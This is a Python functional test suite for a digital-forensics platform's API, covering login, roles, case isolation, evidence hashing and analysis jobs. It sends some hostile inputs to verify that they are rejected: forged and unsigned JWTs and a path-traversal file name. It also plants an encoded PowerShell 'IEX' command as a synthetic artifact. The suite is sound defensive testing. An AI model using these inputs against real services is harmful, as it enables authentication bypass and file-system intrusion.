#!/usr/bin/env python3
"""DFIP full functional test suite.

Runs inside the backend container of the isolated `dfiptest` stack (it needs the
API on 127.0.0.1:8000, Sleuth Kit and regipy for ground truth, and pymongo for
the tamper tests). Every analysis result is checked against ground truth that
does not come from DFIP: the known contents of the synthetic test image
(scripts/test-image/make_artifacts.py) and Sleuth Kit / regipy run directly.

Usage: python dfip_full_test.py <phase>   (phases: main, desktop_writes, reg_open, reg_disabled)
Results: /out/results-<phase>.json
"""
import asyncio
import base64
import hashlib
import io
import json
import os
import re
import sqlite3
import struct
import subprocess
import sys
import tempfile
import time
import traceback
import urllib.error
import urllib.parse
import urllib.request
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path
from zoneinfo import ZoneInfo

BASE = 'http://127.0.0.1:8000'
IMG = Path('/testdata/dfip-test-disk.dd')
OUT = Path('/out')
PW = 'DemoPassword!2026'
PHASE = sys.argv[1] if len(sys.argv) > 1 else 'main'
RESULTS = []
SECTION = ['']
C = {}  # shared context between sections


# ---------------------------------------------------------------- harness
def check(name, cond, detail=''):
    ok = bool(cond)
    RESULTS.append({'phase': PHASE, 'section': SECTION[0], 'name': name, 'ok': ok, 'detail': '' if ok else str(detail)[:800]})
    print(('  PASS ' if ok else '  FAIL ') + name + ('' if ok else f'  ::  {str(detail)[:300]}'), flush=True)
    return ok


def note(name, detail):
    """An observation that is not a pass/fail assertion (recorded for the report)."""
    RESULTS.append({'phase': PHASE, 'section': SECTION[0], 'name': name, 'ok': None, 'detail': str(detail)[:800]})
    print(f'  NOTE {name}: {str(detail)[:300]}', flush=True)


class Resp:
    def __init__(self, status, body, headers):
        self.status, self.body, self.headers = status, body, headers

    @property
    def json(self):
        try:
            return json.loads(self.body)
        except Exception:
            return None

    @property
    def detail(self):
        j = self.json
        return j.get('detail') if isinstance(j, dict) else self.body[:200]

    def __repr__(self):
        return f'<{self.status} {self.body[:300]!r}>'


def req(method, path, token=None, body=None, raw=None, ctype='application/json', headers=None, timeout=900):
    data = raw if raw is not None else (json.dumps(body).encode() if body is not None else None)
    r = urllib.request.Request(BASE + path, data=data, method=method)
    if data is not None:
        r.add_header('Content-Type', ctype)
    if token:
        r.add_header('Authorization', f'Bearer {token}')
    for k, v in (headers or {}).items():
        r.add_header(k, v)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return Resp(resp.status, resp.read(), dict(resp.headers))
    except urllib.error.HTTPError as e:
        return Resp(e.code, e.read(), dict(e.headers))


def get(path, token=None, **kw):
    return req('GET', path, token, **kw)


def post(path, token=None, body=None, **kw):
    return req('POST', path, token, body=body, **kw)


def patch(path, token=None, body=None, **kw):
    return req('PATCH', path, token, body=body, **kw)


def upload(token, case_id, data: bytes, filename, extra=None, headers=None):
    b = uuid.uuid4().hex
    parts = [f'--{b}\r\nContent-Disposition: form-data; name="case_id"\r\n\r\n{case_id}\r\n'.encode()]
    for k, v in (extra or {}).items():
        parts.append(f'--{b}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'.encode())
    parts += [f'--{b}\r\nContent-Disposition: form-data; name="file"; filename="{filename}"\r\n'
              f'Content-Type: application/octet-stream\r\n\r\n'.encode(), data, f'\r\n--{b}--\r\n'.encode()]
    return req('POST', '/api/evidence/upload', token, raw=b''.join(parts),
               ctype=f'multipart/form-data; boundary={b}', headers=headers)


def login(email, password=PW, client='web'):
    return post('/api/auth/login', body={'email': email, 'password': password, 'client': client})


def token_of(email, password=PW):
    r = login(email, password)
    assert r.status == 200, f'login {email}: {r}'
    return r.json['access_token']


def wait_job(token, job_id, timeout=900, trace=None):
    t0 = time.time()
    while time.time() - t0 < timeout:
        j = get(f'/api/jobs/{job_id}', token).json
        if trace is not None:
            trace.append((j.get('progress'), j.get('stage'), j.get('status')))
        if j and j.get('status') in ('COMPLETED', 'FAILED', 'CANCELLED'):
            return j
        time.sleep(0.25)
    return {'status': 'TIMEOUT'}


def iso(s):
    return datetime.fromisoformat(str(s).replace('Z', '+00:00')) if s else None


def utc(*a):
    return datetime(*a, tzinfo=timezone.utc)


def sh(*args, timeout=600):
    return subprocess.run(list(args), capture_output=True, timeout=timeout)


def section(name):
    def deco(fn):
        def run():
            SECTION[0] = name
            print(f'\n== {name}', flush=True)
            try:
                fn()
            except Exception as exc:  # a crash fails the section but the suite continues
                check('section ran to completion', False, f'{type(exc).__name__}: {exc}\n{traceback.format_exc(limit=3)}')
        run.__name__ = fn.__name__
        run.section_id = name.split(' ', 1)[0]
        return run
    return deco


# ---------------------------------------------------------------- ground truth
PAYROLL = ('employee,iban,salary\n' + ''.join(f'emp{i:03d},DE89370400440532013{i:03d},{50000 + i * 1000}\n' for i in range(60))).encode()
NOTES = ('Q3 project notes. Nothing sensitive here.\n' * 40).encode()
CLEANUP = b'powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=\n'
CHROME_VISITS = {
    ('Chrome', 'https://mail.example.com/inbox', 'Inbox - Mail', 12, utc(2026, 9, 1, 8, 55)),
    ('Chrome', 'https://www.google.com/search?q=how+to+wipe+usb+drive', 'how to wipe usb drive - Google Search', 2, utc(2026, 9, 1, 10, 2)),
    ('Chrome', 'https://filetransfer.example.net/upload', 'Anonymous File Upload', 3, utc(2026, 9, 1, 10, 20)),
    ('Chrome', 'https://intranet.corp.example/hr/payroll', 'Payroll Portal', 5, utc(2026, 9, 1, 9, 40)),
    ('Firefox', 'https://pastebin.example.com/raw/x9f2', 'Paste', 1, utc(2026, 9, 1, 10, 31)),
    ('Firefox', 'https://cdn.example.org/tools/archiver.zip', 'archiver.zip', 1, utc(2026, 9, 1, 10, 33)),
}


# The scenario computer is in the US Eastern time zone; FAT stores its local time, which the Sleuth Kit converts with -z.
COMPUTER_TZ = 'America/New_York'


def bodyfile_truth():
    """Parses `fls -r -m / -o 2048` directly: the filesystem as Sleuth Kit sees it."""
    out = sh('fls', '-z', COMPUTER_TZ, '-r', '-m', '/', '-o', '2048', str(IMG)).stdout.decode('utf-8', 'replace')
    entries = []
    for line in out.splitlines():
        p = line.split('|')
        if len(p) < 11:
            continue
        name, inode, mode = p[1], p[2], p[3]
        deleted = name.endswith(' (deleted)') or name.endswith(' (deleted-realloc)')
        name = re.sub(r' \(deleted(-realloc)?\)$', '', name)
        times = {int(t) for t in p[7:11] if t.strip().lstrip('-').isdigit() and int(t) > 0}
        entries.append({'path': name, 'inode': inode, 'mode': mode, 'size': int(p[6] or 0), 'deleted': deleted,
                        'virtual': mode[:1] in ('v', 'V'), 'times': times,
                        'mtime': int(p[8]) if p[8].isdigit() else 0})
    return entries


# ================================================================= MAIN PHASE
@section('01 Platform and health')
def t_platform():
    h = get('/health')
    j = h.json or {}
    check('GET /health is 200 and ok', h.status == 200 and j.get('status') == 'ok', h)
    check('/health reports MongoDB, version 2.1.0, demo mode, approval registration',
          j.get('database') == 'mongodb' and j.get('version') == '2.1.0' and j.get('demo_mode') is True
          and j.get('registration_mode') == 'approval' and j.get('require_desktop_for_writes') is False, j)
    d = get('/docs')
    check('Swagger UI /docs is served', d.status == 200 and b'swagger' in d.body.lower(), d.status)
    o = get('/openapi.json').json or {}
    check('OpenAPI schema lists the API (>= 80 operations)', sum(len(v) for v in o.get('paths', {}).values()) >= 80,
          len(o.get('paths', {})))


SAMPLES = Path('/testdata/samples')  # scripts/test-image/fetch-samples.sh


def sample(source, name):
    """A pinned public test sample, or None when samples were not downloaded."""
    p = SAMPLES / source / name
    return p if p.is_file() else None


def mongo():
    import pymongo
    return pymongo.MongoClient(os.environ['MONGODB_URI'], tz_aware=True)['dfip']


def file_sha256(path):
    h = hashlib.sha256()
    with open(path, 'rb') as f:
        while chunk := f.read(1 << 20):
            h.update(chunk)
    return h.hexdigest()


@section('01b Public test samples')
def t_samples():
    manifest = SAMPLES / 'manifest.json'
    if not manifest.is_file():
        note('public test samples', 'not downloaded (sh scripts/test-image/fetch-samples.sh); sample-based checks will be skipped')
        return
    bad, n = [], 0
    for src in json.loads(manifest.read_text())['sources']:
        for f in src['files']:
            n += 1
            p = SAMPLES / src['name'] / f['name']
            if not p.is_file() or file_sha256(p) != f['sha256']:
                bad.append(f"{src['name']}/{f['name']}")
    check(f'all {n} public samples (dfVFS, Plaso, python-evtx; Apache-2.0) match their pinned SHA-256', not bad, bad)


@section('02 Authentication')
def t_auth():
    expected_roles = {'admin@dfip.local': 'ADMIN', 'investigator@dfip.local': 'INVESTIGATOR',
                      'analyst@dfip.local': 'ANALYST', 'viewer@dfip.local': 'VIEWER'}
    for email, role in expected_roles.items():
        r = login(email)
        j = r.json or {}
        ok = r.status == 200 and j.get('user', {}).get('role') == role and j.get('access_token') and j.get('refresh_token')
        check(f'{role.lower()} demo account signs in', ok, r)
        C[role] = j.get('access_token')
        C[role + '_id'] = j.get('user', {}).get('_id')
        C[role + '_refresh'] = j.get('refresh_token')
        if role == 'ADMIN':
            check('sign-in returns no password hash', 'password_hash' not in r.body.decode(), r.body[:200])
    perms = login('viewer@dfip.local').json['user']['permissions']
    check('viewer permissions are read-only (CASE_READ, EVIDENCE_READ, REPORT_READ)',
          set(perms) == {'CASE_READ', 'EVIDENCE_READ', 'REPORT_READ'}, perms)
    r1, r2 = login('investigator@dfip.local', 'wrong-password-123'), login('nobody@dfip.local', 'whatever-password-1')
    check('wrong password is 401 "Invalid credentials"', r1.status == 401 and r1.detail == 'Invalid credentials', r1)
    check('unknown email gives the identical 401 (no account enumeration)', r2.status == 401 and r2.detail == r1.detail, r2)
    check('email is case-insensitive at sign-in', login('Investigator@DFIP.local').status == 200)
    me = get('/api/auth/me', C['INVESTIGATOR'])
    check('/auth/me returns the user with permissions', me.status == 200 and me.json['email'] == 'investigator@dfip.local'
          and 'ANALYSIS_RUN' in me.json['permissions'], me)
    check('/auth/me without a token is 401', get('/api/auth/me').status == 401)
    check('/auth/me with a garbage token is 401', get('/api/auth/me', 'not.a.jwt').status == 401)
    import jwt as pyjwt
    forged = pyjwt.encode({'sub': C['ADMIN_id'], 'role': 'ADMIN', 'type': 'access',
                           'exp': datetime.now(timezone.utc) + timedelta(hours=1)}, 'some-other-secret-0123456789abcdef', algorithm='HS256')
    check('token signed with another secret is rejected (401)', get('/api/auth/me', forged).status == 401)
    unsigned = pyjwt.encode({'sub': C['ADMIN_id'], 'role': 'ADMIN', 'type': 'access'}, key=None, algorithm='none') \
        if hasattr(pyjwt, 'encode') else 'x'
    check('unsigned (alg=none) token is rejected (401)', get('/api/auth/me', unsigned).status == 401)
    expired = pyjwt.encode({'sub': C['ADMIN_id'], 'role': 'ADMIN', 'type': 'access',
                            'exp': datetime.now(timezone.utc) - timedelta(minutes=1)}, os.environ['JWT_SECRET'], algorithm='HS256')
    check('expired access token is rejected (401)', get('/api/auth/me', expired).status == 401)
    devtok = pyjwt.encode({'sub': C['ADMIN_id'], 'type': 'device_session', 'device_id': 'x',
                           'exp': datetime.now(timezone.utc) + timedelta(hours=1)}, os.environ['JWT_SECRET'], algorithm='HS256')
    check('a device token cannot be used as an access token (401)', get('/api/auth/me', devtok).status == 401)

    # refresh rotation and logout
    lr = login('analyst@dfip.local').json
    rf = post('/api/auth/refresh', body={'refresh_token': lr['refresh_token']})
    check('refresh returns a new access and refresh token', rf.status == 200 and rf.json['refresh_token'] != lr['refresh_token'], rf)
    check('a used refresh token cannot be reused (rotation)', post('/api/auth/refresh', body={'refresh_token': lr['refresh_token']}).status == 401)
    check('access token cannot be used as a refresh token', post('/api/auth/refresh', body={'refresh_token': lr['access_token']}).status == 401)
    post('/api/auth/logout', body={'refresh_token': rf.json['refresh_token']})
    check('logout revokes the refresh token', post('/api/auth/refresh', body={'refresh_token': rf.json['refresh_token']}).status == 401)

    # change password on a fresh account
    email = f'pwchange.{uuid.uuid4().hex[:6]}@test.local'
    cu = post('/api/admin/users', C['ADMIN'], {'name': 'Password Changer', 'email': email, 'role': 'VIEWER', 'password': 'Initial-Password-1'})
    check('admin creates a user', cu.status == 200, cu)
    t = login(email, 'Initial-Password-1').json
    check('wrong current password is refused (400)', post('/api/auth/change-password', t['access_token'],
          {'current_password': 'nope-nope-nope', 'new_password': 'Second-Password-22'}).status == 400)
    check('new password shorter than 12 characters is refused (400)', post('/api/auth/change-password', t['access_token'],
          {'current_password': 'Initial-Password-1', 'new_password': 'short'}).status == 400)
    ok = post('/api/auth/change-password', t['access_token'], {'current_password': 'Initial-Password-1', 'new_password': 'Second-Password-22'})
    check('password change succeeds', ok.status == 200, ok)
    check('old password no longer works', login(email, 'Initial-Password-1').status == 401)
    check('new password works', login(email, 'Second-Password-22').status == 200)
    check('password change revokes existing refresh tokens', post('/api/auth/refresh', body={'refresh_token': t['refresh_token']}).status == 401)


@section('03 Self-service accounts (approval mode)')
def t_register():
    email = f'Meera.{uuid.uuid4().hex[:6]}@Example.org'
    pw = 'Correct-Horse-Battery-7'
    r = post('/api/auth/register', body={'name': 'Meera Nair', 'email': email, 'password': pw})
    check('register returns 201 PENDING with an explanation', r.status == 201 and r.json['status'] == 'PENDING'
          and 'administrator' in r.json['message'], r)
    lp = login(email, pw)
    check('pending account cannot sign in (403 awaiting approval)', lp.status == 403 and 'approval' in lp.detail, lp)
    check('pending account with a wrong password gets 401, not the status', login(email, 'wrong-password-xyz').status == 401)
    check('duplicate email (different case) is 409', post('/api/auth/register', body={'name': 'Other', 'email': email.upper(), 'password': pw}).status == 409)
    check('password under 12 characters is 422', post('/api/auth/register', body={'name': 'Short Pw', 'email': 'a' + email, 'password': 'short'}).status == 422)
    check('invalid email is 422', post('/api/auth/register', body={'name': 'Bad Email', 'email': 'not-an-email', 'password': pw}).status == 422)
    check('blank name (spaces) is refused', post('/api/auth/register', body={'name': '    ', 'email': 'b' + email, 'password': pw}).status in (400, 422))
    loc = post('/api/auth/register', body={'name': 'Internal Domain', 'email': f'it.{uuid.uuid4().hex[:6]}@corp.local', 'password': pw})
    check('an internal .local email address can register', loc.status == 201, loc)
    notes = get('/api/notifications', C['ADMIN']).json['data']
    check('administrators are notified of the pending account', any(email.lower() in n.get('message', '') for n in notes),
          [n.get('title') for n in notes[:5]])
    users = get('/api/admin/users', C['ADMIN']).json['data']
    me = next((u for u in users if u['email'] == email.lower()), None)
    check('admin sees the pending user (email stored lower-case)', me and me['status'] == 'PENDING', me)
    check('user list never contains password hashes', all('password_hash' not in u for u in users))
    up = patch(f"/api/admin/users/{me['_id']}", C['ADMIN'], {'status': 'ACTIVE', 'role': 'ANALYST'})
    check('admin approves and assigns the ANALYST role', up.status == 200 and up.json['status'] == 'ACTIVE' and up.json['role'] == 'ANALYST', up)
    li = login(email, pw)
    check('approved user signs in with the assigned role', li.status == 200 and li.json['user']['role'] == 'ANALYST', li)
    tok = li.json['access_token']
    patch(f"/api/admin/users/{me['_id']}", C['ADMIN'], {'status': 'DISABLED'})
    ld = login(email, pw)
    check('disabled account cannot sign in (403 disabled)', ld.status == 403 and 'disabled' in ld.detail, ld)
    check("a disabled user's existing token stops working", get('/api/auth/me', tok).status == 401)
    check('invalid status value is refused (400)', patch(f"/api/admin/users/{me['_id']}", C['ADMIN'], {'status': 'GODMODE'}).status == 400)
    check('invalid role is refused (400)', patch(f"/api/admin/users/{me['_id']}", C['ADMIN'], {'role': 'ROOT'}).status == 400)
    check('admin cannot create a duplicate email (409)', post('/api/admin/users', C['ADMIN'], {'name': 'Dup', 'email': 'VIEWER@dfip.local',
          'role': 'VIEWER', 'password': 'Another-Password-1'}).status == 409)
    bad = post('/api/admin/users', C['ADMIN'], {'name': 'Bad Mail', 'email': 'not-an-email', 'role': 'VIEWER', 'password': 'Another-Password-1'})
    check('admin-created user with an invalid email is refused', bad.status in (400, 422), bad)


@section('04 Cases and case isolation')
def t_cases():
    inv = C['INVESTIGATOR']
    r = post('/api/cases', inv, {'name': 'Payroll exfiltration test', 'description': 'Full functional test', 'priority': 'HIGH'})
    year = datetime.now(timezone.utc).year
    check('investigator creates a case with a sequential ID', r.status == 200 and re.fullmatch(rf'CASE-{year}-\d{{3}}', r.json['case_id']), r)
    A = C['A'] = r.json['case_id']
    check('new case is OPEN and assigned to its creator', r.json['status'] == 'OPEN' and r.json['investigator_id'] == C['INVESTIGATOR_id'], r.json)
    r2 = post('/api/cases', inv, {'name': 'Second test case', 'priority': 'LOW'})
    n1, n2 = int(A.rsplit('-', 1)[1]), int(r2.json['case_id'].rsplit('-', 1)[1])
    check('case numbers increase by one', n2 == n1 + 1, (A, r2.json['case_id']))
    C['B'] = r2.json['case_id']
    check('invalid priority is 400', post('/api/cases', inv, {'name': 'Bad priority', 'priority': 'URGENT'}).status == 400)
    check('one-character name is 422', post('/api/cases', inv, {'name': 'x'}).status == 422)
    check('name over 120 characters is 422', post('/api/cases', inv, {'name': 'x' * 121}).status == 422)
    check('unknown investigator assignment is 400', post('/api/cases', inv, {'name': 'Bad assignee', 'investigator_id': 'ffffffffffffffffffffffff'}).status == 400)
    check('case appears in the list', any(c['case_id'] == A for c in get('/api/cases', inv).json['data']))
    up = patch(f'/api/cases/{A}', inv, {'status': 'IN_PROGRESS', 'priority': 'CRITICAL'})
    check('status and priority can be updated', up.status == 200 and up.json['status'] == 'IN_PROGRESS' and up.json['priority'] == 'CRITICAL', up)
    check('invalid status is 400', patch(f'/api/cases/{A}', inv, {'status': 'DONE'}).status == 400)
    blank = patch(f'/api/cases/{C["B"]}', inv, {'name': ''})
    check('renaming a case to an empty name is refused', blank.status in (400, 422), blank)

    # a second investigator who is not on case A
    email2 = f'inv2.{uuid.uuid4().hex[:6]}@test.local'
    post('/api/admin/users', C['ADMIN'], {'name': 'Second Investigator', 'email': email2, 'role': 'INVESTIGATOR', 'password': 'Second-Investigator-1'})
    C['INV2'] = token_of(email2, 'Second-Investigator-1')
    C['INV2_id'] = get('/api/auth/me', C['INV2']).json['_id']
    D = post('/api/cases', C['INV2'], {'name': 'Other team case'}).json['case_id']
    C['D'] = D
    i2 = C['INV2']
    check("another investigator cannot open the case (404)", get(f'/api/cases/{A}', i2).status == 404)
    check("...nor see it in the case list", all(c['case_id'] != A for c in get('/api/cases', i2).json['data']))
    check("...nor its overview", get(f'/api/cases/{A}/overview', i2).status == 404)
    check("...nor update it", patch(f'/api/cases/{A}', i2, {'status': 'ARCHIVED'}).status == 404)
    check("...nor upload evidence into it", upload(i2, A, b'x' * 10, 'x.dd').status == 404)
    check('investigator cannot open the other team case either', get(f'/api/cases/{D}', inv).status == 404)
    check('administrator sees every case', {A, D} <= {c['case_id'] for c in get('/api/cases', C['ADMIN']).json['data']})


@section('05 Roles and permissions (RBAC)')
def t_rbac():
    v, an, inv = C['VIEWER'], C['ANALYST'], C['INVESTIGATOR']
    check('viewer cannot create a case (403)', post('/api/cases', v, {'name': 'Viewer case'}).status == 403)
    check('analyst cannot create a case (403)', post('/api/cases', an, {'name': 'Analyst case'}).status == 403)
    for path in ('/api/admin/users', '/api/admin/roles', '/api/admin/stats', '/api/admin/security'):
        check(f'investigator is refused {path} (403)', get(path, inv).status == 403)
        check(f'viewer is refused {path} (403)', get(path, v).status == 403)
    check('viewer cannot read the audit log (403)', get('/api/admin/audit', v).status == 403)
    check('viewer cannot run audit-chain verification (403)', get('/api/chain/verify', v).status == 403)
    check('investigator may read the audit log (AUDIT_READ)', get('/api/admin/audit', inv).status == 200)
    # case visible to the viewer: admin assigns it
    cv = post('/api/cases', C['ADMIN'], {'name': 'Viewer read-only case', 'investigator_id': C['VIEWER_id']})
    C['V_CASE'] = cv.json['case_id']
    check('admin can assign a case to a viewer', cv.status == 200, cv)
    check('viewer can read the assigned case', get(f"/api/cases/{C['V_CASE']}", v).status == 200)
    check('viewer cannot update it (403)', patch(f"/api/cases/{C['V_CASE']}", v, {'status': 'ON_HOLD'}).status == 403)
    check('viewer cannot upload evidence (403)', upload(v, C['V_CASE'], b'x' * 10, 'x.dd').status == 403)
    check('viewer cannot create findings (403)', post('/api/findings', v, {'case_id': C['V_CASE'], 'title': 'Nope', 'description': 'x'}).status == 403)
    check('viewer cannot create reports (403)', post(f"/api/reports?case_id={C['V_CASE']}", v).status == 403)
    check('viewer cannot run pattern analysis (403)', post(f"/api/forensics/patterns?case_id={C['V_CASE']}", v).status == 403)


@section('06 Evidence upload and preservation')
def t_evidence():
    inv, A = C['INVESTIGATOR'], C['A']
    data = IMG.read_bytes()
    C['IMG_SHA256'] = hashlib.sha256(data).hexdigest()
    C['IMG_SHA512'] = hashlib.sha512(data).hexdigest()
    bad = upload(inv, A, b'hello', 'notes.txt')
    check('non-image file type is refused (400)', bad.status == 400 and 'Unsupported' in bad.detail, bad)
    r = upload(inv, A, data, 'laptop-07.dd')
    j = r.json or {}
    check('raw .dd image uploads', r.status == 200 and re.fullmatch(r'EVID-\d{3}', j.get('evidence_id', '')), r)
    E = C['E'] = j['evidence_id']
    check('stored SHA-256 equals the SHA-256 of the file', j.get('sha256') == C['IMG_SHA256'], (j.get('sha256'), C['IMG_SHA256']))
    check('stored SHA-512 equals the SHA-512 of the file', j.get('sha512') == C['IMG_SHA512'])
    check('size, format and status recorded', j.get('size') == len(data) and j.get('format') == 'DD' and j.get('verification_status') == 'VERIFIED', j)
    p = Path(j['storage_path'])
    check('original is stored read-only (mode 0444)', p.exists() and (p.stat().st_mode & 0o777) == 0o444, oct(p.stat().st_mode))
    check('original is stored under evidence/original', '/evidence/original/' in str(p), p)
    cust = get(f'/api/chain?case_id={A}', inv).json['data']
    reg = [c for c in cust if c['evidence_id'] == E and c['action'] == 'EVIDENCE_REGISTERED']
    check('chain of custody records the registration with the hash', reg and reg[0]['sha256'] == C['IMG_SHA256'], reg)
    v = post(f'/api/evidence/{E}/verify', inv)
    check('manual re-verification: VERIFIED, hash unchanged', v.status == 200 and v.json['verification_status'] == 'VERIFIED'
          and v.json['current_sha256'] == C['IMG_SHA256'], v)
    vc = [c for c in get(f'/api/chain?case_id={A}', inv).json['data'] if c['action'] == 'EVIDENCE_VERIFIED']
    check("the verification is in custody under the user's name", vc and vc[0].get('user_name') == 'Demo Investigator', vc[:1])
    jv = post(f'/api/jobs/verify/{E}', inv).json['job_id']
    jj = wait_job(inv, jv)
    check('background HASH_VERIFY job completes VERIFIED', jj['status'] == 'COMPLETED' and jj['result']['status'] == 'VERIFIED', jj.get('error'))
    check('evidence appears in the list and detail', any(e['evidence_id'] == E for e in get('/api/evidence', inv).json['data'])
          and get(f'/api/evidence/{E}', inv).json['sha256'] == C['IMG_SHA256'])
    check('another investigator cannot open the evidence', get(f'/api/evidence/{E}', C['INV2']).status in (403, 404))
    trav = upload(inv, C['B'], b'\0' * 512, '../../../../tmp/evil.dd')
    check('path traversal in the upload name is neutralised', trav.status == 200 and trav.json['filename'] == 'evil.dd'
          and '/evidence/original/' in trav.json['storage_path'] and not Path('/tmp/evil.dd').exists(), trav)
    C['TRAV_E'] = trav.json.get('evidence_id')
    import glob
    before = set(glob.glob('/app/storage/evidence/original/*'))
    forged = upload(inv, C['B'], data, 'second-copy.dd', extra={'sha512': '0' * 128})
    check('an upload whose client SHA-512 does not match is refused (400) and discarded',
          forged.status == 400 and set(glob.glob('/app/storage/evidence/original/*')) == before, forged)
    good = upload(inv, C['B'], data, 'second-copy.dd', extra={'sha512': C['IMG_SHA512'].upper()})
    check('an upload with a matching client SHA-512 is accepted', good.status == 200 and good.json.get('sha512') == C['IMG_SHA512'], good)
    C['B_E'] = good.json.get('evidence_id')
    check('the same image can be registered in a different case', good.status == 200 and good.json.get('case_id') == C['B'], good)
    before = set(glob.glob('/app/storage/evidence/original/*'))
    dup = upload(inv, A, data, 'renamed-copy.dd')
    check('the same image uploaded again to its case is refused (409) whatever its file name, naming the existing evidence',
          dup.status == 409 and E in (dup.detail or ''), dup)
    check('...and the duplicate is discarded, not registered', set(glob.glob('/app/storage/evidence/original/*')) == before
          and [e['evidence_id'] for e in get('/api/evidence', inv).json['data'] if e['case_id'] == A] == [E])


@section('07 Full analysis job')
def t_analysis():
    inv, E = C['INVESTIGATOR'], C['E']
    trace = []
    job = post(f'/api/jobs/analysis/{E}', inv)
    check('analysis job is queued', job.status == 200 and job.json['job_id'].startswith('JOB-'), job)
    t0 = time.time()
    j = wait_job(inv, job.json['job_id'], trace=trace)
    C['ANALYSIS_SECONDS'] = round(time.time() - t0, 1)
    check('analysis job completes', j['status'] == 'COMPLETED', (j.get('status'), j.get('error')))
    progress = [p for p, s, st in trace if isinstance(p, (int, float))]
    check('progress only moves forward and ends at 100', progress == sorted(progress) and progress[-1] == 100, progress[-10:])
    check('job reports intermediate stages', len({s for _, s, _ in trace}) >= 3, sorted({s for _, s, _ in trace if s}))
    counts = j['result']['summary']['counts']
    C['COUNTS'] = counts
    note('analysis counts', counts)
    note('analysis duration (s)', C['ANALYSIS_SECONDS'])
    ev = get(f'/api/evidence/{E}', inv).json
    check('evidence marked analysed with a summary', ev.get('analysis_status') == 'COMPLETED' and ev.get('analysis_summary') == counts, ev.get('analysis_status'))
    cust = get(f"/api/chain?case_id={C['A']}", inv).json['data']
    ic = [c for c in cust if c['action'] == 'ANALYSIS_INTEGRITY_CHECK' and c['evidence_id'] == E]
    check('analysis re-verifies integrity first and logs it to custody', ic and ic[0].get('sha256') == C['IMG_SHA256'], ic[:1])
    check('another investigator cannot follow the job (403)', get(f"/api/jobs/{job.json['job_id']}", C['INV2']).status == 403)
    check('job appears in the job list', any(x['job_id'] == job.json['job_id'] for x in get('/api/jobs', inv).json['data']))
    # idempotent re-run
    j2 = wait_job(inv, post(f'/api/jobs/analysis/{E}', inv).json['job_id'])
    check('re-running the analysis gives identical counts (no duplicates)', j2['status'] == 'COMPLETED'
          and j2['result']['summary']['counts'] == counts, (counts, j2.get('result', {}).get('summary', {}).get('counts')))


# The standard profile's modules that apply to a disk image (network applies only to network captures).
STANDARD_MODULES = ['tz_probe', 'fs_index', 'computer', 'artifacts', 'registry', 'unix', 'phone', 'eventlogs', 'user_activity', 'ntfs', 'shadow_copies',
                    'browser_depth', 'fileproc', 'email', 'chat_cloud', 'media', 'executables', 'reputation', 'clamav', 'hash_match', 'yara']
# The full profile adds archive members, file contents, unallocated space and found data.
ALL_MODULES = ['tz_probe', 'fs_index', 'computer', 'artifacts', 'registry', 'unix', 'phone', 'eventlogs', 'user_activity', 'ntfs', 'shadow_copies', 'browser_depth',
               'fileproc', 'containers', 'email', 'chat_cloud', 'network', 'media', 'ocr', 'executables', 'reputation', 'clamav', 'hash_match', 'yara', 'content',
               'unallocated', 'found_data']
# What re-reading the file system index refreshes on evidence analysed with the standard profile.
AFTER_FS_INDEX = ['fs_index', 'artifacts', 'registry', 'unix', 'phone', 'eventlogs', 'user_activity', 'ntfs', 'shadow_copies', 'browser_depth', 'fileproc', 'email', 'chat_cloud',
                  'media', 'executables', 'reputation', 'clamav', 'hash_match', 'yara']


def _ids(db, col, q):
    return sorted(str(x['_id']) for x in db[col].find(q, {'_id': 1}))


def _analyse(token, eid, body=None):
    """Starts an analysis (waiting for any running one first) and returns the finished job."""
    for _ in range(60):
        r = post(f'/api/jobs/analysis/{eid}', token, body)
        if r.status != 409:
            break
        time.sleep(1)
    return wait_job(token, r.json['job_id'])


@section('07b Analysis modules, profiles and re-runs')
def t_modules():
    inv, E = C['INVESTIGATOR'], C['E']
    db = mongo()
    mods = get(f'/api/evidence/{E}', inv).json.get('modules') or {}
    check('each module of the standard profile completed, with its counts and version',
          set(mods) == set(STANDARD_MODULES) and all(m.get('status') == 'COMPLETED' and isinstance(m.get('counts'), dict)
                                                               and m.get('version') for m in mods.values()),
          {k: v.get('status') for k, v in mods.items()})
    d = get('/api/jobs/analysis/modules', inv).json or {}
    check('the modules and the three profiles are listed', [m['name'] for m in d.get('modules', [])] == ALL_MODULES
          and {p['name'] for p in d.get('profiles', [])} == {'quick', 'standard', 'full'} and d.get('default_profile') == 'standard', d)
    check('an unknown profile or module is refused (400)', post(f'/api/jobs/analysis/{E}', inv, {'profile': 'everything'}).status == 400
          and post(f'/api/jobs/analysis/{E}', inv, {'modules': ['nope']}).status == 400)
    check('viewer cannot start an analysis (403)', post(f'/api/jobs/analysis/{E}', C['VIEWER'], {'modules': ['yara']}).status == 403)

    # Re-running one module replaces only its own output.
    fs_before = _ids(db, 'fs_entries', {'evidence_id': E})
    art_before = _ids(db, 'forensic_artifacts', {'evidence_id': E, 'pipeline_module': 'artifacts'})
    yara_before = list(db.forensic_artifacts.find({'evidence_id': E, 'type': 'MALWARE_INDICATOR'}))
    r = post(f'/api/jobs/analysis/{E}', inv, {'modules': ['yara']})
    busy = post(f'/api/jobs/analysis/{E}', inv)
    if busy.status == 200:  # the first job already finished: wait for the extra one too
        wait_job(inv, busy.json['job_id'])
    check('a second analysis of the same evidence is refused while one is queued or running (409)',
          busy.status == 409 and r.json['job_id'] in (busy.detail or ''), busy)
    j = wait_job(inv, r.json['job_id'])
    s = (j.get('result') or {}).get('summary') or {}
    check('re-running one module runs only that module', j['status'] == 'COMPLETED' and s.get('plan') == ['yara'], (j.get('status'), s.get('plan')))
    check("the other modules' records are untouched (same database IDs)",
          fs_before == _ids(db, 'fs_entries', {'evidence_id': E}) and art_before == _ids(db, 'forensic_artifacts', {'evidence_id': E, 'pipeline_module': 'artifacts'}),
          (len(fs_before), len(art_before)))
    yara_after = list(db.forensic_artifacts.find({'evidence_id': E, 'type': 'MALWARE_INDICATOR'}))
    check('the re-run module replaced its own records (new IDs, same match)',
          len(yara_before) == len(yara_after) == 1 and yara_after[0]['_id'] != yara_before[0]['_id']
          and yara_after[0]['rule'] == yara_before[0]['rule'] and yara_after[0]['pipeline_module'] == 'yara', yara_after[:1])
    check('the job summary still reports the whole evidence', s.get('counts') == C['COUNTS'], (s.get('counts'), C['COUNTS']))
